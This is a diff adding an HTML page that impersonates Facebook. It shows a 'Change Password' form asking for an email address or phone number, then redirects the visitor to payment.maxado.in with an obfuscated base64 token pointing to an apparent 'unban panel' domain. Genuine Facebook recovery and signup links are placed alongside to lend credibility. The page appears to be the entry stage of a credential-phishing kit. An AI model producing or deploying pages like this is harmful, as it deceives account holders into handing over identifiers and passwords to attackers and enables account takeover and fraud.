@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f3f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 380px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box {
+            padding: 20px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #dddfe2;
+        }
+
+        input.error {
+            border: 1px solid red;
+            background-color: #ffdddd;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #165eab;
+        }
+
+        .forgotten-account {
+            margin-top: 10px;
+        }
+
+        .forgotten-account a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .create-account {
+            margin-top: 20px;
+        }
+
+        .create-account a {
+            color: #42b72a;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        /* Responsive Design */
+        @media only screen and (max-width: 768px) {
+            .login-container {
+                width: 90%;
+                max-width: 360px;
+            }
+
+            h2 {
+                font-size: 24px;
+            }
+
+            input {
+                font-size: 14px;
+            }
+
+            button {
+                font-size: 16px;
+            }
+        }
+
+        /* For very small screens (like Android phones) */
+        @media only screen and (max-width: 480px) {
+            .login-container {
+                width: 95%;
+                max-width: 380px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            input {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            button {
+                font-size: 15px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Facebook</h2>
+            <form id="loginForm" action="javascript:void(0);">
+                <input type="text" id="emailOrPhone" placeholder="Email Address or Phone Number">
+                <button type="submit" onclick="validateForm()">Change Password</button>
+            </form>
+            <div class="forgotten-account">
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_blank">Forgotten account?</a>
+            </div>
+            <div class="create-account">
+                <p><a href="https://www.facebook.com/r.php?locale=en_GB&display=page" target="_blank">Create New Account</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function validateForm() {
+            var emailOrPhoneInput = document.getElementById('emailOrPhone');
+            var inputValue = emailOrPhoneInput.value.trim();
+
+            // Phone number validation (10 digits)
+            var phonePattern = /^[0-9]{10}$/;
+
+            // Email validation (only @ symbol)
+            var emailPattern = /@/;
+
+            // Check if input is valid
+            if (inputValue === "") {
+                emailOrPhoneInput.classList.add('error');
+                return false;
+            }
+
+            if (phonePattern.test(inputValue)) {
+                emailOrPhoneInput.classList.remove('error');
+                window.location.href = "https://payment.maxado.in/index.php?token=OTh8fGFIUjBjSE02THk5MWJtSmhibkJoYm1Wc0xuTmljeTltWWk5d1lYTnpkMjl5WkM5blpYUmlZV05yfHxodHRwczovL3VuYmFucGFuZWwuc2JzL2ZiL2xvY2tlZC9mYWNlYm9vay1sb2dvLnN2Zw==";  // Redirect for valid phone number
+            } else if (emailPattern.test(inputValue)) {
+                emailOrPhoneInput.classList.remove('error');
+                window.location.href = "https://payment.maxado.in/index.php?token=OTh8fGFIUjBjSE02THk5MWJtSmhibkJoYm1Wc0xuTmljeTltWWk5d1lYTnpkMjl5WkM5blpYUmlZV05yfHxodHRwczovL3VuYmFucGFuZWwuc2JzL2ZiL2xvY2tlZC9mYWNlYm9vay1sb2dvLnN2Zw==";  // Redirect for valid email
+            } else {
+                emailOrPhoneInput.classList.add('error');
+            }
+        }
+    </script>
+</body>
+</html>
